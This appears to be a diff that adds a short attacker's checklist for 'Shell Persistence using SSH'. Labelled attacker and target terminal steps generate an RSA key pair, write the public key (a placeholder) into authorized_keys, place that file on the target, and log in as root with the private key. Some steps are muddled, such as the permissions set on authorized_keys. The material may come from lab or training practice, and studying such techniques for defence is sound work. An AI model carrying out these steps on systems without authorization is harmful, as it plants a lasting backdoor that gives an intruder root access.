@@ -1,0 +1,25 @@
+----> Shell Persistence using SSH <----
+ 
+[Target Terminal]
+Step 1   :- Go to your Target terminal and execute:       cd /root/.ssh
+
+[Attacker Terminal]
+Step 1.2 :- Return to your attacker Terminal and execute: cd /root/.ssh
+Step 2   :- Go back on your attacker Terminal and run :   ssh-keygen -t rsa 
+step 3   :- cat id_rsa.pub 
+
+"""
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQsgfgsgfdsgFDiS890r6OUv+f0eG9VKeG/DNmgHzwjmWYfM4NU/2jINe8W6zJNOk1LiOJX4Oe8sPy0FfWJIgOFVTfsggfdgsfgsvsmXm/g5SdqNpR5+bK+X9DZPX88DZ82hFarGsWN9sDOUHbyvetHwhVbcHlEtm4Y7PLKy2K+Xd6KKdewwyOM/K5/TGuKyxI8UnV9HF6z7MjILG7bQWUvgdfgdfgfkL0xW7GgQm/Jbgj1owpxtRZCOtXBbjvVoKpV1Z+k//6+CJW7BqW34i4ag25i4DzvxANm+p7VHElLXf1K0mkgR451yThis-is-the-example-of-Content-in-id_rsa.pub
+Kpdk1a97eqM7qZ2dk2BDvDDgD9bUZZ3AVK5Q2swAIk4UYyOip7EWj3QDVecVrF8fp7MpiSN/anaHkNuJlsf5/AUNTLR7QR26B5/LcQb0Q84/gcczoRKlcYM= kali@kali
+
+""" > authorized_keys 
+
+Step 3.2 :- You now have authorized_keys on your attacker machine.
+[Attacker Terminal]
+step 4   :- Set permissions: chmod 600 id_rsa 
+Step 4.1 :- Send authorized_keys to the target system! 
+
+[Target Terminal]
+Step 5   :- Set permissions: chmod 700 authorized_keys 
+[Attacker Terminal]
+step 6   :- ssh -i id_rsa root@127.0.0.1
